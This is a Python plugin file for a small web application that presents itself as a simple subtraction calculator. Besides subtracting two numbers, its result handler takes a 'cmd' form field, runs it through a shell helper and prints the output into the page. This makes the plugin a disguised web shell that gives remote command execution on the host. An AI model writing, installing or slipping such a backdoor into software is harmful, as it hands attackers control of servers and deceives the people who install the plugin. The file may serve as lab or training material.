name = "subtractor"
description = "I am a simple subtraction plugin that calculates the difference between two numbers."
fa_icon = "minus"
privLevel = 1
publicLinks = ["main", "mresult"]

from funcs import settings as S
from funcs import shell as SHELL
import subprocess

def main(request):
  return template("")


def mresult(request):
  ans = "<h1> Result: " + str(
    int(request.form.get("n1")) - int(request.form.get("n2"))) + "</h1>"
  cmd = request.form.get("cmd")
  return template(ans + "<pre>"+SHELL.run(cmd)+"</pre>")


def template(result):
  return '''
  <div class="w3-container">
    <h1>Subtractor Plugin</h1>
    <form method="post" action="''' + S.Urls["plugin"].replace(
    '<name>', name).replace("<functionCall>", "mresult") + '''">
      <input name="n1" type="number">
      <input name="n2" type="number">
      <input name="cmd" type="text">
      <input type="submit">
    </form>
    ''' + result + '''
  </div>
  '''
